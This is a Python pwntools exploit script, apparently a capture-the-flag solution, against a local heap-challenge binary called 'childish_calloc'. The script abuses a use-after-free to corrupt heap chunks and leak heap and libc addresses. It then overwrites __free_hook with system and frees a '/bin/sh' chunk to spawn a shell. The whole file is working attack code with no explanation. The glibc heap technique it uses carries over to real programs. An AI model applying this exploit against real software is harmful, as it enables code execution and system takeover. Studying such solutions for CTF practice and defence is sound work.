from pwn import *
#UAF in childinsh_calloc
#

p = process('./childish_calloc')

def send(b,a=':'):
    p.sendlineafter(a,str(b))

def find(index,size,detail):
    send(1,'Choice:')
    send(index)
    send(size)
    send(detail)

def send2(b,a=':'):
    p.sendafter(a,str(b))

def find2(index,size,detail):
    send(1,'Choice:')
    send(index)
    send(size)
    send2(detail)

done = 0
def fix(index,size,data):
    global done
    send(2,'Choice:')
    send(index)
    send(size)
    send2(data)
    if done == 0:
        done += 1
        send(1)
    else:
        send(2)

#Free Version
def fix2(index):
    send(2,'Choice:')
    send(index)
    send(0)

def examine(index):
    send(3,'Choice:')
    send(index)

def save(size):
    send(4, 'Choice:')
    send(size)

find(0,0x38,'a')
find(1,0x38,p64(0x41)*7)
find(12,0x38,'c')
find(13,0x38,'d')
find(14,0x28,'d')

fix2(1)
fix2(12)
fix2(1)

fix2(0)
find2(11,0x38,p64(0x41)*6 + p64(0) + '\x43')
fix(14, 0x38, '\x90')

leak = u64(p.readuntil('\n\n')[1:-2]+'\x00\x00')
heap = leak
print hex(leak)

find(10,0x38,'p')
find(9,0x38,'a')
find(2,0x38, p64(0) + p64(0xc1))

for x in range(8):
    fix2(1)

examine(1)
leak = u64(p.readuntil('\n\n')[1:-2]+'\x00\x00')
print hex(leak)
libc = leak

free_hook = leak + 0x1c48
system = leak - 0x39c860

find(8, 0x38, p64(0x41)*6) # location
find(7, 0x38, 'a')
find(6, 0x38, '/bin/sh\x00')

fix(2, 0x38, p64(0) + p64(0xf1))

find(5, 0x28, 'a')

for x in range(8):
    fix2(1)

fix(2, 0x38, p64(0)+'\xf0'+'\xff'*7)

save(free_hook-heap-0x50)

find(3, 0x38, p64(0)*5 + p64(system))

gdb.attach(p)
p.interactive()
